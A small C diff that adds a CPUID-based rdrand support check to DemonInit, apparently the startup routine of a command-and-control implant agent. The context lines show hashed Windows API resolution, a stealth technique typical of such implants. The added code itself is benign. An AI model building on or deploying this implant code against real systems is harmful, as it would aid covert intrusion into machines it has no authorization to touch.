@@ -458,6 +458,18 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.GlobalFree                      = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GLOBALFREE );
     }
 
+    /* Check if the rdrand instruction is supported */
+    unsigned int eax, ecx;
+    eax = 1;
+    int regs[4];
+    __cpuid(regs, eax);
+    ecx = regs[2];
+
+    if ( ecx & ( 1 << 30 ) ) {
+        Instance->RdRand = TRUE;
+        PUTS( "rdrand instruction is supported" )
+    }
+
     /* now that we loaded some of the basic apis lets parse the config and see how we load the rest */
     /* Parse config */
     DemonConfig();
